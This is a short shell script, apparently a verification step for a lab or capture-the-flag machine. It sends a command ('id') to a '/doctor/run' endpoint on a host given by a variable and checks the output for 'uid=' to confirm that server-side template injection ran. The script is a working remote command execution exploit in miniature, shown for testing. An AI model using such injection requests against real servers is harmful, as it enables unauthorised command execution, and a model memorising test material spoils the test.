set -eu
out=$(curl -fsS "http://${BOX_HOST}:8092/doctor/run?cmd=id")
echo "$out"
echo "$out" | grep -q 'uid=' || { echo "SSTI did not execute" >&2; exit 1; }
